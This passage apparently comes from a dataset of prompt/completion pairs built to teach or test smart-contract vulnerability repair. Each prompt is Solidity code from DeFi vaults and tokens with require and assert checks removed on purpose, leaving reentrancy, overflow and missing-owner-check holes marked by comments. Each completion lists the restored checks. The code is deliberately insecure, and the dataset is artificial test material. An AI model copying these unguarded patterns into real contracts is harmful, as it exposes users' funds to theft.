*/\n233     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {       \n234         return a % b;\n235     }\n236 }\n\n237 // File: @openzeppelin/contracts/utils/Address.sol\n\n\n238 /**\n239  * @dev Collection of functions related to the address type\n240  */\n241 library Address {\n242     /**\n243      * @dev Returns true if `account` is a contract.\n244      *\n245      * [IMPORTANT]\n246      * ====\n247      * It is unsafe to assume that an address for which this function returns\n248      * false is an externally-owned account (EOA) and not a contract.\n249      *\n250      * Among others, `isContract` will return false for the following\n251      * types of addresses:\n252      *\n253      *  - an externally-owned account\n254      *  - a contract in construction\n255      *  - an address where a contract will be created\n256      *  - an address where a contract lived, but was destroyed\n257      * ====\n258      */\n259     function isContract(address account) internal view returns (bool) {\n260         // This method relies in extcodesize, which returns 0 for contracts in\n261         // construction, since the code is only stored at the end of the\n262         // constructor execution.\n\n263         uint256 size;\n264         // solhint-disable-next-line no-inline-assembly\n265         assembly { size := extcodesize(account) }\n266         return size > 0;\n267     }\n\n268     /**\n269      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n270      * `recipient`, forwarding all available gas and reverting on errors.\n271      *\n272      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n273      * of certain opcodes, possibly making contracts go over the 2300 gas limit\n274      * imposed by `transfer`, making them unable to receive funds via\n275      * `transfer`. {sendValue} removes this limitation.\n276      *\n277      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n278      *\n279      * IMPORTANT: because control is transferred to `recipient`, care must be\n280      * taken to not create reentrancy vulnerabilities. Consider using\n281      * {ReentrancyGuard} or the\n282      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n283      */\n284     function sendValue(address payable recipient, uint256 amount) internal {       \n\n285         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n286         (bool success, ) = recipient.call{ value: amount }(\"\");\n287     }\n\n288     /**\n289      * @dev Performs a Solidity function call using a low level `call`. A\n290      * plain`call` is an unsafe replacement for a function call: use this\n291      * function instead.\n292      *\n293      * If `target` reverts with a revert reason, it is bubbled up by this\n294      * function (like regular Solidity function calls).\n295      *\n296      * Returns the raw returned data. To convert to the expected return value,\n297      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n298      *\n299      * Requirements:\n300      *\n301      * - `target` must be a contract.\n302      * - calling `target` with `data` must not revert.\n303      *\n304      * _Available since v3.1._\n305      */\n306     function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n307       return functionCall(target, data, \"Address: low-level call failed\");\n308     }\n\n309     /**\n310      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n311      * `errorMessage` as a fallback revert reason when `target` reverts.\n312      *\n313      * _Available since v3.1._\n314      */\n315     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n316         return _functionCallWithValue(target, data, 0, errorMessage);\n317     }\n\n318     /**\n319      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n320      * but also transferring `value` wei to `target`.\n321      *\n322      * Requirements:\n323      *\n324      * - the calling contract must have an ETH balance of at least `value`.\n325      * - the called Solidity function must be `payable`.\n326      *\n327      * _Available since v3.1._\n328      */\n329     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n330         return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n331     }\n\n332     /**\n333      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n334      * with `errorMessage` as a fallback revert reason when `target` reverts.\n335      *\n336      * _Available since v3.1._\n337      */\n338     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {       \n339         return _functionCallWithValue(target, data, value, errorMessage);\n340     }\n\n341     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {        \n\n342         // solhint-disable-next-line avoid-low-level-calls\n343         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n344         if (success) {\n345             return returndata;\n346         } else {\n347             // Look for revert reason and bubble it up if present\n348             if (returndata.length > 0) {\n349                 // The easiest way to bubble the revert reason is using memory via assembly\n\n350                 // solhint-disable-next-line no-inline-assembly\n351                 assembly {\n352                     let returndata_size := mload(returndata)\n353                     revert(add(32, returndata), returndata_size)\n354                 }\n355             } else {\n356                 revert(errorMessage);\n357             }\n358         }\n359     }\n360 }\n\n361 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol\n\n\n\n\n\n\n362 /**\n363  * @dev Implementation of the {IERC20} interface.\n364  *\n365  * This implementation is agnostic to the way tokens are created. This means\n366  * that a supply mechanism has to be added in a derived contract using {_mint}.\n367  * For a generic mechanism see {ERC20PresetMinterPauser}.\n368  *\n369  * TIP: For a detailed writeup see our guide\n370  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n371  * to implement supply mechanisms].\n372  *\n373  * We have followed general OpenZeppelin guidelines: functions revert instead\n374  * of returning `false` on failure. This behavior is nonetheless conventional\n375  * and does not conflict with the expectations of ERC20 applications.\n376  *\n377  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n378  * This allows applications to reconstruct the allowance for all accounts just\n379  * by listening to said events. Other implementations of the EIP may not emit\n380  * these events, as it isn't required by the specification.\n381  *\n382  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n383  * functions have been added to mitigate the well-known issues around setting\n384  * allowances. See {IERC20-approve}.\n385  */\n386 contract ERC20 is Context, IERC20 {\n387     using SafeMath for uint256;\n388     using Address for address;\n\n389     mapping (address => uint256) private _balances;\n\n390     mapping (address => mapping (address => uint256)) private _allowances;\n\n391     uint256 private _totalSupply;\n\n392     string private _name;\n393     string private _symbol;\n394     uint8 private _decimals;\n\n395     /**\n396      * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n397      * a default value of 18.\n398      *\n399      * To select a different value for {decimals}, use {_setupDecimals}.\n400      *\n401      * All three of these values are immutable: they can only be set once during\n402      * construction.\n403      */\n404     constructor (string memory name, string memory symbol) public {\n405         _name = name;\n406         _symbol = symbol;\n407         _decimals = 18;\n408     }\n\n409     /**\n410      * @dev Returns the name of the token.\n411      */\n412     function name() public view returns (string memory) {\n413         return _name;\n414     }\n\n415     /**\n416      * @dev Returns the symbol of the token, usually a shorter version of the\n417      * name.\n418      */\n419     function symbol() public view returns (string memory) {\n420         return _symbol;\n421     }\n\n422     /**\n423      * @dev Returns the number of decimals used to get its user representation.\n424      * For example, if `decimals` equals `2`, a balance of `505` tokens should\n425      * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n426      *\n427      * Tokens usually opt for a value of 18, imitating the relationship between\n428      * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n429      * called.\n430      *\n431      * NOTE: This information is only used for _display_ purposes: it in\n432      * no way affects any of the arithmetic of the contract, including\n433      * {IERC20-balanceOf} and {IERC20-transfer}.\n434      */\n435     function decimals() public view returns (uint8) {\n436         return _decimals;\n437     }\n\n438     /**\n439      * @dev See {IERC20-totalSupply}.\n440      */\n441     function totalSupply() public view override returns (uint256) {\n442         return _totalSupply;\n443     }\n\n444     /**\n445      * @dev See {IERC20-balanceOf}.\n446      */\n447     function balanceOf(address account) public view override returns (uint256) {\n448         return _balances[account];\n449     }\n\n450     /**\n451      * @dev See {IERC20-transfer}.\n452      *\n453      * Requirements:\n454      *\n455      * - `recipient` cannot be the zero address.\n456      * - the caller must have a balance of at least `amount`.\n457      */\n458     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n459         _transfer(_msgSender(), recipient, amount);\n460         return true;\n461     }\n\n462     /**\n463      * @dev See {IERC20-allowance}.\n464      */\n465     function allowance(address owner, address spender) public view virtual override returns (uint256) {\n466         return _allowances[owner][spender];\n467     }\n\n468     /**\n469      * @dev See {IERC20-approve}.\n470      *\n471      * Requirements:\n472      *\n473      * - `spender` cannot be the zero address.\n474      */\n475     function approve(address spender, uint256 amount) public virtual override returns (bool) {\n476         _approve(_msgSender(), spender, amount);\n477         return true;\n478     }\n\n479     /**\n480      * @dev See {IERC20-transferFrom}.\n481      *\n482      * Emits an {Approval} event indicating the updated allowance. This is not\n483      * required by the EIP. See the note at the beginning of {ERC20};\n484      *\n485      * Requirements:\n486      * - `sender` and `recipient` cannot be the zero address.\n487      * - `sender` must have a balance of at least `amount`.\n488      * - the caller must have allowance for ``sender``'s tokens of at least\n489      * `amount`.\n490      */\n491     function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n492         _transfer(sender, recipient, amount);\n493         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n494         return true;\n495     }\n\n496     /**\n497      * @dev Atomically increases the allowance granted to `spender` by the caller.\n498      *\n499      * This is an alternative to {approve} that can be used as a mitigation for\n500      * problems described in {IERC20-approve}.\n501      *\n502      * Emits an {Approval} event indicating the updated allowance.\n503      *\n504      * Requirements:\n505      *\n506      * - `spender` cannot be the zero address.\n507      */\n508     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n509         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n510         return true;\n511     }\n\n512     /**\n513      * @dev Atomically decreases the allowance granted to `spender` by the caller.\n514      *\n515      * This is an alternative to {approve} that can be used as a mitigation for\n516      * problems described in {IERC20-approve}.\n517      *\n518      * Emits an {Approval} event indicating the updated allowance.\n519      *\n520      * Requirements:\n521      *\n522      * - `spender` cannot be the zero address.\n523      * - `spender` must have allowance for the caller of at least\n524      * `subtractedValue`.\n525      */\n526     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n527         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n528         return true;\n529     }\n\n530     /**\n531      * @dev Moves tokens `amount` from `sender` to `recipient`.\n532      *\n533      * This is internal function is equivalent to {transfer}, and can be used to\n534      * e.g. implement automatic token fees, slashing mechanisms, etc.\n535      *\n536      * Emits a {Transfer} event.\n537      *\n538      * Requirements:\n539      *\n540      * - `sender` cannot be the zero address.\n541      * - `recipient` cannot be the zero address.\n542      * - `sender` must have a balance of at least `amount`.\n543      */\n544     function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n       \n\n545         _beforeTokenTransfer(sender, recipient, amount);\n\n546         _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n547         _balances[recipient] = _balances[recipient].add(amount);\n548         emit Transfer(sender, recipient, amount);\n549     }\n\n550     /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n551      * the total supply.\n552      *\n553      * Emits a {Transfer} event with `from` set to the zero address.\n554      *\n555      * Requirements\n556      *\n557      * - `to` cannot be the zero address.\n558      */\n559     function _mint(address account, uint256 amount) internal virtual {\n    \n560         _beforeTokenTransfer(address(0), account, amount);\n\n561         _totalSupply = _totalSupply.add(amount);\n562         _balances[account] = _balances[account].add(amount);\n563         emit Transfer(address(0), account, amount);\n564     }\n\n565     /**\n566      * @dev Destroys `amount` tokens from `account`, reducing the\n567      * total supply.\n568      *\n569      * Emits a {Transfer} event with `to` set to the zero address.\n570      *\n571      * Requirements\n572      *\n573      * - `account` cannot be the zero address.\n574      * - `account` must have at least `amount` tokens.\n575      */\n576     function _burn(address account, uint256 amount) internal virtual {\n     \n577         _beforeTokenTransfer(account, address(0), amount);\n\n578         _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n579         _totalSupply = _totalSupply.sub(amount);\n580         emit Transfer(account, address(0), amount);\n581     }\n\n582     /**\n583      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n584      *\n585      * This internal function is equivalent to `approve`, and can be used to\n586      * e.g. set automatic allowances for certain subsystems, etc.\n587      *\n588      * Emits an {Approval} event.\n589      *\n590      * Requirements:\n591      *\n592      * - `owner` cannot be the zero address.\n593      * - `spender` cannot be the zero address.\n594      */\n595     function _approve(address owner, address spender, uint256 amount) internal virtual {\n       \n596         _allowances[owner][spender] = amount;\n597         emit Approval(owner, spender, amount);\n598     }\n\n599     /**\n600      * @dev Sets {decimals} to a value other than the default one of 18.\n601      *\n602      * WARNING: This function should only be called from the constructor. Most\n603      * applications that interact with token contracts will not expect\n604      * {decimals} to ever change, and may work incorrectly if it does.\n605      */\n606     function _setupDecimals(uint8 decimals_) internal {\n607         _decimals = decimals_;\n608     }\n\n609     /**\n610      * @dev Hook that is called before any transfer of tokens. This includes\n611      * minting and burning.\n612      *\n613      * Calling conditions:\n614      *\n615      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n616      * will be to transferred to `to`.\n617      * - when `from` is zero, `amount` tokens will be minted for `to`.\n618      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n619      * - `from` and `to` are never both zero.\n620      *\n621      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n622      */\n623     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n624 }\n\n625 // File: @openzeppelin/contracts/token/ERC20/SafeERC20.sol\n\n\n626 /**\n627  * @title SafeERC20\n628  * @dev Wrappers around ERC20 operations that throw on failure (when the token\n629  * contract returns false). Tokens that return no value (and instead revert or\n630  * throw on failure) are also supported, non-reverting calls are assumed to be\n631  * successful.\n632  * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\n633  * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\n634  */\n635 library SafeERC20 {\n636     using SafeMath for uint256;\n637     using Address for address;\n\n638     function safeTransfer(IERC20 token, address to, uint256 value) internal {\n639         _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n640     }\n\n641     function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {\n642         _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n643     }\n\n644     /**\n645      * @dev Deprecated. This function has issues similar to the ones found in\n646      * {IERC20-approve}, and its usage is discouraged.\n647      *\n648      * Whenever possible, use {safeIncreaseAllowance} and\n649      * {safeDecreaseAllowance} instead.\n650      */\n651     function safeApprove(IERC20 token, address spender, uint256 value) internal {\n652         // safeApprove should only be called when setting an initial allowance,\n653         // or when resetting it to zero. To increase and decrease it, use\n654         // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n655         // solhint-disable-next-line max-line-length       \n656         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n657     }\n\n658     function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {\n659         uint256 newAllowance = token.allowance(address(this), spender).add(value);\n660         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n661     }\n\n662     function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {\n663         uint256 newAllowance = token.allowance(address(this), spender).sub(value, \"SafeERC20: decreased allowance below zero\");\n664         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\n665     }\n\n666     /**\n667      * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n668      * on the return value: the return value is optional (but if data is returned, it must not be false).\n669      * @param token The token targeted by the call.\n670      * @param data The call data (encoded using abi.encode or one of its variants).\n671      */\n672     function _callOptionalReturn(IERC20 token, bytes memory data) private {\n673         // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\n674         // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\n675         // the target address contains contract code and also asserts for success in the low-level call.\n\n676         bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed in vault\");\n677         if (returndata.length > 0) { // Return data is optional\n678             // solhint-disable-next-line max-line-length         \n679         }\n680     }\n681 }\n\n682 // File: @openzeppelin/contracts/access/Ownable.sol\n\n\n683 /**\n684  * @dev Contract module which provides a basic access control mechanism, where\n685  * there is an account (an owner) that can be granted exclusive access to\n686  * specific functions.\n687  *\n688  * By default, the owner account will be the one that deploys the contract. This\n689  * can later be changed with {transferOwnership}.\n690  *\n691  * This module is used through inheritance. It will make available the modifier\n692  * `onlyOwner`, which can be applied to your functions to restrict their use to\n693  * the owner.\n694  */\n695 contract Ownable is Context {\n696     address private _owner;\n\n697     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n698     /**\n699      * @dev Initializes the contract setting the deployer as the initial owner.\n700      */\n701     constructor () internal {\n702         address msgSender = _msgSender();\n703         _owner = msgSender;\n704         emit OwnershipTransferred(address(0), msgSender);\n705     }\n\n706     /**\n707      * @dev Returns the address of the current owner.\n708      */\n709     function owner() public view returns (address) {\n710         return _owner;\n711     }\n\n712     /**\n713      * @dev Throws if called by any account other than the owner.\n714      */\n715     modifier onlyOwner() {     \n716         _;\n717     }\n\n718     /**\n719      * @dev Leaves the contract without owner. It will not be possible to call\n720      * `onlyOwner` functions anymore. Can only be called by the current owner.\n721      *\n722      * NOTE: Renouncing ownership will leave the contract without an owner,\n723      * thereby removing any functionality that is only available to the owner.\n724      */\n725     function renounceOwnership() public virtual onlyOwner {\n726         emit OwnershipTransferred(_owner, address(0));\n727         _owner = address(0);\n728     }\n\n729     /**\n730      * @dev Transfers ownership of the contract to a new account (`newOwner`).\n731      * Can only be called by the current owner.\n732      */\n733     function transferOwnership(address newOwner) public virtual onlyOwner {       \n734         emit OwnershipTransferred(_owner, newOwner);\n735         _owner = newOwner;\n736     }\n737 }\n\n\n\n738 /**\n739  * @title Helps contracts guard against reentrancy attacks.\n740  * @author Remco Bloemen <remco@2\u03c0.com>, Eenae <alexey@mixbytes.io>\n741  * @dev If you mark a function `nonReentrant`, you should also\n742  * mark it `external`.\n743  */\n744 contract ReentrancyGuard {\n\n745   /// @dev counter to allow mutex lock with only one SSTORE operation\n746   uint256 private _guardCounter = 1;\n\n747   /**\n748    * @dev Prevents a contract from calling itself, directly or indirectly.\n749    * If you mark a function `nonReentrant`, you should also\n750    * mark it `external`. Calling one `nonReentrant` function from\n751    * another is not supported. Instead, you can implement a\n752    * `private` function doing the actual work, and an `external`\n753    * wrapper marked as `nonReentrant`.\n754    */\n755   modifier nonReentrant() {\n756     _guardCounter += 1;\n757     uint256 localCounter = _guardCounter;\n758     _;\n759   }\n\n760 }\n\n\n761 interface IStrategy {\n762     function vault() external view returns (address);\n763     function want() external view returns (IERC20);\n764     function beforeDeposit() external;\n765     function deposit() external;\n766     function withdraw(uint256) external;\n767     function balanceOfPool() external view returns (uint256);\n768     function harvest() external;\n769     function retireStrat() external;\n770     function panic() external;\n771     function pause() external;\n772     function unpause() external;\n773     function paused() external view returns (bool);\n774 }\n\n775 /**\n776  * @dev Implementation of a vault to deposit funds for yield optimizing.\n777  * This is the contract that receives funds and that users interface with.\n778  * The yield optimizing strategy itself is implemented in a separate 'Strategy.sol' contract.\n779  */\n780 contract GrimBoostVault is ERC20, Ownable, ReentrancyGuard {\n781     using SafeERC20 for IERC20;\n782     using SafeMath for uint256;\n\n783     struct StratCandidate {\n784         address implementation;\n785         uint proposedTime;\n786     }\n\n787     // The last proposed strategy to switch to.\n788     StratCandidate public stratCandidate;\n789     // The strategy currently in use by the vault.\n790     IStrategy public strategy;\n791     // The minimum time it has to pass before a strat candidate can be approved.\n792     uint256 public immutable approvalDelay;\n\n793     event NewStratCandidate(address implementation);\n794     event UpgradeStrat(address implementation);\n\n795   //this is the buggy functon: the attacker inserts his/her own addr at token, which containn\n796   //depositFor() loop \n\n797     function depositFor(address token, uint _amount,address user ) public {\n798         uint256 _pool = balance();\n799         IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);\n800         earn();\n801         uint256 _after = balance();\n802         _amount = _after.sub(_pool); // Additional check for deflationary tokens\n803         uint256 shares = 0;\n804         if (totalSupply() == 0) {\n805             shares = _amount;\n806         } else {\n807             shares = (_amount.mul(totalSupply())).div(_pool);\n808         }\n809         _mint(user, shares);\n810     }\n811 }",
        "completion": "124+  require(c >= a, \"SafeMath: addition overflow\");\n137+  return sub(a, b, \"SafeMath: subtraction overflow\");\n150+  require(b <= a, errorMessage);\n171+ require(c / a == b, \"SafeMath: multiplication overflow\");\n201+ require(b > 0, errorMessage);\n233+ require(b != 0, errorMessage);\n284+ require(address(this).balance >= amount, \"Address: insufficient balance\");\n286+ require(success, \"Address: unable to send value, recipient may have reverted\");\n338+ require(address(this).balance >= value, \"Address: insufficient balance for call\");\n341+ require(isContract(target), \"Address: call to non-contract\");\n544+ require(sender != address(0), \"ERC20: transfer from the zero address\");\n544+ require(recipient != address(0), \"ERC20: transfer to the zero address\");\n559+  require(account != address(0), \"ERC20: mint to the zero address\");\n576+  require(account != address(0), \"ERC20: burn from the zero address\");\n595+  require(owner != address(0), \"ERC20: approve from the zero address\");\n595+  require(spender != address(0), \"ERC20: approve to the zero address\");\n655+ require((value == 0) || (token.allowance(address(this), spender) == 0),\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\n        );\n678+   require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\n715+ require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n733+ require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n757+ require(localCounter == _guardCounter);\n797+ assert(token != address(this)); \n797+ assert(token != user); \n\n"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at BscScan.com on 2021-07-30\n3 */\n\n4 //SPDX-License-Identifier: MIT\n5 pragma solidity ^0.8.0;\n\n\n6 abstract contract ReentrancyGuard {\n7         uint256 private constant _NOT_ENTERED = 1;\n8         uint256 private constant _ENTERED = 2;\n9         uint256 private _status;\n10         constructor () {\n11             _status = _NOT_ENTERED;\n12         }\n    \n13         modifier nonReentrant() {           \n14             _status = _ENTERED;\n15             _;\n16             _status = _NOT_ENTERED;\n17         }\n18     }\n\n\n19 contract surgeToken{\n  \n20   /** Sells SURGE Tokens And Deposits the BNB into Seller's Address */\n21     function sell(uint256 tokenAmount) public nonReentrant returns (bool) {\n        \n22         address seller = msg.sender;\n        \n23         // make sure seller has this balance        \n24         // calculate the sell fee from this transaction\n25         uint256 tokensToSwap = tokenAmount.mul(sellFee).div(10**2);\n        \n26         // how much BNB are these tokens worth?\n27         uint256 amountBNB = tokensToSwap.mul(calculatePrice());\n        \n28         //reentrant happens here: during call fallback, the attacker invoked purchase multiple times\n29         (bool successful,) = payable(seller).call{value: amountBNB, gas: 40000}(\"\"); \n30         if (successful) {\n31             // subtract full amount from sender\n32             _balances[seller] = _balances[seller].sub(tokenAmount, 'sender does not have this amount to sell');\n33             // if successful, remove tokens from supply\n34             _totalSupply = _totalSupply.sub(tokenAmount);\n35         } else {\n36             revert();\n37         }\n38         emit Transfer(seller, address(this), tokenAmount);\n39         return true;\n40     }\n\n    \n41     function purchase(address buyer, uint256 bnbAmount) internal returns (bool) {\n42         // make sure we don't buy more than the bnb in this contract       \n43         // previous amount of BNB before we received any        \n44         uint256 prevBNBAmount = (address(this).balance).sub(bnbAmount);\n45         // if this is the first purchase, use current balance\n46         prevBNBAmount = prevBNBAmount == 0 ? address(this).balance : prevBNBAmount;\n47         // find the number of tokens we should mint to keep up with the current price\n48         uint256 nShouldPurchase = hyperInflatePrice ? _totalSupply.mul(bnbAmount).div(address(this).balance) : _totalSupply.mul(bnbAmount).div(prevBNBAmount);\n49         // apply our spread to tokens to inflate price relative to total supply\n50         uint256 tokensToSend = nShouldPurchase.mul(spreadDivisor).div(10**2);\n51         // revert if under 1\n52         if (tokensToSend < 1) {\n53             revert('Must Buy More Than One Surge');\n54         }\n55     }\n56 }",
        "completion": "13+ require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n23+ require(_balances[seller] >= tokenAmount, 'cannot sell above token amount');\n42+  require(bnbAmount <= address(this).balance, 'purchase not included in balance');\n       "
    },
    {
        "prompt": "1 // Sources flattened with hardhat v2.1.2 https://hardhat.org\n\n2 // File contracts/v0.4/token/linkERC20Basic.sol\n\n3 pragma solidity ^0.4.11;\n\n\n4 /**\n5  * @title ERC20Basic\n6  * @dev Simpler version of ERC20 interface\n7  * @dev see https://github.com/ethereum/EIPs/issues/179\n8  */\n9 contract linkERC20Basic {\n10   uint256 public totalSupply;\n11   function balanceOf(address who) constant returns (uint256);\n12   function transfer(address to, uint256 value) returns (bool);\n13   event Transfer(address indexed from, address indexed to, uint256 value);\n14 }\n\n\n15 // File contracts/v0.4/token/linkERC20.sol\n\n\n16 /**\n17  * @title ERC20 interface\n18  * @dev see https://github.com/ethereum/EIPs/issues/20\n19  */\n20 contract linkERC20 is linkERC20Basic {\n21   function allowance(address owner, address spender) constant returns (uint256);\n22   function transferFrom(address from, address to, uint256 value) returns (bool);\n23   function approve(address spender, uint256 value) returns (bool);\n24   event Approval(address indexed owner, address indexed spender, uint256 value);\n25 }\n\n\n26 // File contracts/v0.4/token/ERC677.sol\n\n\n27 contract ERC677 is linkERC20 {\n28   function transferAndCall(address to, uint value, bytes data) returns (bool success);\n\n29   event Transfer(address indexed from, address indexed to, uint value, bytes data);\n30 }\n\n\n31 // File contracts/v0.4/token/ERC677Receiver.sol\n\n\n32 contract ERC677Receiver {\n33   function onTokenTransfer(address _sender, uint _value, bytes _data);\n34 }\n\n\n35 // File contracts/v0.4/ERC677Token.sol\n\n36 contract ERC677Token is ERC677 {\n\n37   /**\n38   * @dev transfer token to a contract address with additional data if the recipient is a contact.\n39   * @param _to The address to transfer to.\n40   * @param _value The amount to be transferred.\n41   * @param _data The extra data to be passed to the receiving contract.\n42   */\n43   function transferAndCall(address _to, uint _value, bytes _data)\n44     public\n45     returns (bool success)\n46   {\n47     super.transfer(_to, _value);\n48     Transfer(msg.sender, _to, _value, _data);\n49     if (isContract(_to)) {\n50       contractFallback(_to, _value, _data);\n51     }\n52     return true;\n53   }\n\n\n54   // PRIVATE\n55  //bug: this is the buggy fall back that allows reentrancy\n56   function contractFallback(address _to, uint _value, bytes _data)\n57     private\n58   {\n59     ERC677Receiver receiver = ERC677Receiver(_to);\n60     receiver.onTokenTransfer(msg.sender, _value, _data);\n61   }\n\n62   function isContract(address _addr)\n63     private\n64     returns (bool hasCode)\n65   {\n66     uint length;\n67     assembly { length := extcodesize(_addr) }\n68     return length > 0;\n69   }\n\n70 }\n\n\n71 abstract contract CToken {\n        \n72         function doTransferOut(address payable to, uint amount) virtual internal;\n\n73         doTransferOut(borrower, borrowAmount);\n        \n74         /* We write the previously calculated values into storage */\n75         accountBorrows[borrower].principal = vars.accountBorrowsNew;\n76         accountBorrows[borrower].interestIndex = borrowIndex;\n77         totalBorrows = vars.totalBorrowsNew;\n \n78         /* We emit a Borrow event */\n79         emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);\n\n80 }\n81 // File contracts/v0.4/math/linkSafeMath.sol\n\n\n\n82 /**\n83  * @title SafeMath\n84  * @dev Math operations with safety checks that throw on error\n85  */\n86 library linkSafeMath {\n87   function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n88     uint256 c = a * b;\n89     return c;\n90   }\n\n91   function div(uint256 a, uint256 b) internal constant returns (uint256) {\n92     // assert(b > 0); // Solidity automatically throws when dividing by 0\n93     uint256 c = a / b;\n94     // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n95     return c;\n96   }\n\n97   function sub(uint256 a, uint256 b) internal constant returns (uint256) {   \n98     return a - b;\n99   }\n\n100   function add(uint256 a, uint256 b) internal constant returns (uint256) {\n101     uint256 c = a + b;  \n102     return c;\n103   }\n104 }",
        "completion": "88+  assert(a == 0 || c / a == b);\n97+ assert(b <= a);\n101+  assert(c >= a);\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: BUSL-1.1\n\n2 pragma solidity 0.7.6;\n\n3 import \"@openzeppelin/contracts/math/SafeMath.sol\";\n4 import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n5 import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n6 import \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\n7 import \"@openzeppelin/contracts/access/Ownable.sol\";\n8 import \"./interfaces/IVisor.sol\";\n9 import \"./vVISR.sol\";\n\n10 // @title Rewards Hypervisor\n11 // @notice fractionalize balance \n12 contract RewardsHypervisor {\n13     using SafeERC20 for IERC20;\n14     using SafeMath for uint256;\n\n15     address public owner;\n16     IERC20 public visr;\n17     vVISR public vvisr;\n\n18     modifier onlyOwner {     \n19         _;\n20     }\n\n21     constructor(\n22         address _visr,\n23         address _vvisr\n24     ) {\n25         visr = IERC20(_visr);\n26         vvisr = vVISR(_vvisr);\n27         owner = msg.sender;\n28     }\n\n29     function deposit(\n30         uint256 visrDeposit,\n31         address payable from,\n32         address to\n33     ) external returns (uint256 shares) {\n34         shares = visrDeposit;\n35         if (vvisr.totalSupply() != 0) {\n36           uint256 visrBalance = visr.balanceOf(address(this));\n37           shares = shares.mul(vvisr.totalSupply()).div(visrBalance);\n38         }\n\n39         //this is the buggy line \n40         //call the owner function of the attack contract. \n41         //As long as the attack contract sets the return value to the contract address\n42         // call the delegatedTransferERC20 function of the attack contract. \n43         //Here reentrancy is executed\n44         if(isContract(from)) {        \n45           //deposit func is called again \n46           IVisor(from).delegatedTransferERC20(address(visr), address(this), visrDeposit);\n47         }\n48         else {\n49           visr.safeTransferFrom(from, address(this), visrDeposit);\n50         }\n\n51         vvisr.mint(to, shares);\n52     }\n\n53     // @param shares Number of rewards shares to redeem for VISR\n54     // @param to Address to which redeemed pool assets are sent\n55     // @param from Address from which liquidity tokens are sent\n56     // @return rewards Amount of visr redeemed by the submitted liquidity tokens\n57     function withdraw(\n58         uint256 